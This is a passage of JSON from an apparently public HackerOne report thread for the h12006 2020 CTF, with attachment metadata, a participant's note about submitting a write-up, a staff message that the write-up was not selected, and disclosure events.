iT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bffa92af1cd029c0c9feade410b13e343e8c5e35ee3d4794e15116b386694577"},{"id":860566,"filename":"2fa-payment.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PRoN7p1QLZmmDV9538yc6UeX?response-content-disposition=attachment%3B%20filename%3D%222fa-payment.JPG%22%3B%20filename%2A%3DUTF-8%27%272fa-payment.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=14d9f28d6e1a38c5dcfd155d4113dca8947eb7b33b01e28314ad7f07ddcbc351"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8242664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Finally I had some spare time to submit my write-up, sorry for the delay 🤟🏾","automated_response":false,"created_at":"2020-06-09T13:13:07.052Z","updated_at":"2020-06-09T13:13:07.052Z","actor":{"username":"smaury","cleared":false,"url":"/smaury","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/679ftrx6ioflymqjri2icob4yl1k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22mauri-crop.jpg%22%3B%20filename%2A%3DUTF-8%27%27mauri-crop.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=425b77090e9e25cacd9a25c06c4346b5bbe7499d44e30614f8424d9c3e1a5273"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8268354,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up, look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:06:56.227Z","updated_at":"2020-06-11T23:06:56.227Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324946,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:27:56.061Z","updated_at":"2020-06-17T22:27:56.061Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"smaury","url":"/smaury"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8327662,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose the write-up?","automated_response":false,"created_at":"2020-06-18T05:30:49.729Z","updated_at":"2020-06-18T05:30:49.729Z","first_to_agree":true,"actor":{"username":"smaury","cleared":false,"url":"/smaury","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/679ftrx6ioflymqjri2icob4yl1k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22mauri-crop.jpg%22%3B%20filename%2A%3DUTF-8%27%27mauri-crop.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZV3IBMDT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153817Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHx%2BIgfH0%2FRLQqbPD5vv6PNps92HY0yneL0kxkNwZHOyAiALrXRJqTvQQGm0xEkYGCB0kbPjUCCkzSeRztvcuetAYyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM5FTPTB1nK4gXIBLuKtcDHmLbKhsWpyXKgWy1fAYOf0DZEqCEqF9ns7RwihS1bFM9%2BSDXYY0CmIqutWQhK5asoL8jbJZ39%2FJ2eai2SoxTlg3PhjMpNNSUfPFgauwX6vt%2FoeK9VnB1Hmqg6bCNA62qIJPnlTONluGngv604Y6CnYL9Se%2B%2BjgOpqhqmIOX9KlzGAoRM0Ci%2BrWGdELH8Q66bSHmapdLHPWMoGBEj%2BeruK3oCs%2BDaUQ1aE%2FEQ8R5PgqLM3Pq6DrZV9PlFixmkikk8SpDcsFEiT0Zw0gsy2qPz3z3BHAEuG64GguAhIs5FvYP7HbdpPv7rQz4QSDXgN3SIbVD0A4kcV1iNQpZyiw2rmdxuUWIk46d%2FT0u%2B7j9yAdfpDuPVKPDHJD35k0pB6VLe7RtlSwwvcDUa7LL6FJxvOPpupIMPSy51BJl9%2Bf8022a6pcy263zeRDGJjALAc6brW%2BvQoDUu%2FQP%2BdxwOLZvXCyyGJp2%2BK86jg8qU%2FLWZ4DVeR3bIO1n7Fw%2B53iFlBIMatC3ZSLlV1J7dSDCk74u6OWvql%2Brvb6q%2Bj8NHQK6luFckQV%2B9okMhTYuNniW3sHS8rjyNrrGhP8vMtxMzink9EL%2FmU0Oxusg2wmaXCDfIKpDDmspvZQv8MJ%2F%2FkIsGOqYBaz2hfRV48KDU0Mx0UomuXdEWK6oszm51EnI%2FeSepVmINgIWWggB7gENawN0rgfpMSIqQjB%2BpErtoDw1jNWaknZlAG9GLkCZ49lNHNirjr7iPk7LouunUzSZjaag8Yc19L8BAWjyLZnHXpqUZQRBSoqOcAoct3F46M7AzK2ewXHmh7aKY3cfAQTu9yVTJd2CDpuLtlyUDUa37BJ8%2F84puzgJS34jmeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=425b77090e9e25cacd9a25c06c4346b5bbe7499d44e30614f8424d9c3e1a5273"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332791,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T15:29:10.714Z","updated_at":"2020-06-18T15:29:10.714Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332792,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-18T15:29:10.787Z","updated_at":"2020-06-18T15:29:10.787Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}